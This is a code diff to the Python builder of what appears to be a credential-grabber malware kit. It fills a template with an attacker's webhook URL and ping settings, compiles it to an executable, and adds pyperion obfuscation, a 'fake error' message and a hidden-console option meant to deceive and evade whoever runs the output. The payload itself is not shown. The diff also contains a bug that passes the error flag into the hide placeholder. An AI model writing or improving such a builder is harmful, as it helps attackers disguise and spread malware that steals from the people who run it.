@@ -1,3 +1,4 @@
+from ast import Str
 import os
 import requests
 import random
@@ -9,6 +10,7 @@ from json import load
 from urllib.request import urlopen
 from alive_progress import alive_bar
 from colorama import Fore, Style, init
+from pyperion import obfuscate
 
 class Builder:
     def __init__(self) -> None:
@@ -35,13 +37,29 @@ class Builder:
             self.ping = True
 
             self.pingtype = input(
-                f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Ping type (here/everyone): ').lower()
+                f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Ping type? (here/everyone): ').lower()
             if self.pingtype not in ["here", "everyone"]:
                 # default to @here if invalid ping type.
                 self.pingtype == "here"
         else:
             self.ping = False
             self.pingtype = "none"
+
+        self.error = input(
+            f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Add a fake error? (y/n): ')
+
+        if self.error.lower() == 'y':
+            self.error = True
+        else:
+            self.error = False
+
+        self.hide = input(
+            f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Hide console? (y/n): ')
+
+        if self.hide.lower() == 'y':
+            self.hide = True
+        else:
+            self.hide = False
 
         self.compy = input(
                 f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Do you want to compile the file to a .exe? (y/n):')
@@ -168,8 +186,10 @@ class Builder:
 
         with open(f"{filename}.py", "w", encoding="utf-8") as f:
             f.write(code.replace('%webhook_here%', webhook)
-                    .replace("\"%ping_enabled%\"", str(self.ping))
-                    .replace("%ping_type%", self.pingtype))
+            .replace("\"%ping_enabled%\"", str(self.ping))
+            .replace("%ping_type%", self.pingtype)
+            .replace("\"%_error_enabled%\"", str(self.error))
+            .replace("\"%_hide_enabled%\"", str(self.error)))
 
         if self.compy == 'y':
             self.compile(filename)
